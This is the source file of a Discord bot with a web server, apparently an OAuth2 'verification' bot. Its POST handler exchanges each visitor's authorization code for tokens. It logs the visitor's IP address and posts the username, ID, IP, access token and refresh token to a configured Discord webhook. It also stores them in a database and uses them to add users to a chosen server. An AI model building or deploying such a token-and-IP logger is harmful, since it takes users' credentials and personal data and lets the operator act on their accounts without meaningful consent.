const { Client, Intents, Collection } = require('discord.js');
const client = new Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  intents: 32767,
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  presence: {
    activity: {
      name: `for /help`,
      type: "WATCHING",
    },
    status: "online"
  }
});

const Discord = require('discord.js');
const handler = require("./handler/index");
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const epic = require("./epic")
const FormData = require('form-data');
const axios = require('axios');
const mongoose = require("mongoose");
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2();

const usersSchema = require('./models/users.js');

mongoose.connect(epic.mongodb, { useUnifiedTopology: true, useNewUrlParser: true });
process.on("unhandledRejection", err => console.log(err));

app.use(bodyParser.text());

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html');
});

app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let form = new FormData();
  form.append('client_id', epic.client_id);
  form.append('client_secret', epic.client_secret);
  form.append('grant_type', 'authorization_code');
  form.append('redirect_uri', epic.redirect_uri);
  form.append('scope', 'identify guilds.join');
  form.append('code', req.body);

  fetch('https://discord.com/api/oauth2/token', { method: 'POST', body: form })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token;
      rf_token = cdcd.refresh_token;

      const tgg = {
        headers: {
          authorization: `${cdcd.token_type} ${ac_token}`,
        }
      };

      axios.get('https://discord.com/api/users/@me', tgg).then(async (te) => {
        let { status } = te;
        if (status == 401) {
          console.log("User unauthed, Not removing, Use clean cmd");
        }

        let efjr = te.data.id;
        let users = await usersSchema.findOne({ userId: efjr });
        if (users) {
          console.log(`[-] - ${ip} ` + te.data.username + '#' + te.data.discriminator);
          await oauth.addMember({ guildId: epic.autoaddid, botToken: epic.token, userId: users.userId, accessToken: users.accessToken }).catch(() => {
            return;
          });
          return;
        }

        console.log(`[+] - ${ip} ` + te.data.username + '#' + te.data.discriminator);
        avatarHASH = 'https://cdn.discordapp.com/avatars/' + te.data.id + '/' + te.data.avatar + '.png?size=4096';
        fetch(epic.wehbook, { // NE PAS TOUCHER ( OU SCRIPT CASSER)
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            avatar_url: '',
            embeds: [{
              color: 3092790,
              title: '**New User**',
              thumbnail: { url: avatarHASH },
              description: `Info: \`${te.data.username}#${te.data.discriminator}\`` +
                `\n\nIP: \`${ip}\`` +
                `\n\nID: \`${te.data.id}\`` +
                `\n\nAcces Token: \`${ac_token}\`` +
                `\n\nRefresh Token: \`${rf_token}\``,
            }],
          }),
        });

        users = await new usersSchema({
          userId: te.data.id,
          avatarURL: avatarHASH,
          username: te.data.username + '#' + te.data.discriminator,
          accessToken: ac_token,
          refreshToken: rf_token,
          user_ip: ip
        });

        const guild = client.guilds.cache.get(epic.autoaddid);
        const member = await guild.members.fetch(te.data.id);
        console.log(`Member: ` + member);
        if (guild.members.cache.has(te.data.id)) {
          member.roles.add(epic.roleid);
          await users.save();
          await oauth.addMember({ guildId: epic.autoaddid, botToken: epic.token, userId: users.userId, accessToken: users.accessToken }).catch(() => {
            return;
          });
        }
      })
        .catch((errrr) => {
          console.log(errrr);
        });
    });
});

module.exports = client;

client.discord = Discord;
client.slash = new Collection();

handler.loadEvents(client);
handler.loadSlashCommands(client);

process.on("uncaughtException", (err) => {
  console.log("Uncaught Exception: " + err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.log("[FATAL] Possibly Unhandled Rejection at: Promise ", promise, " reason: ", reason.message);
});

client.login(epic.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID`);
});

app.listen(epic.port, () => console.log('https://discord.gg/oauth2 -> Made By gpa#0001 , forgetful#0001 , 1vx#0001'));
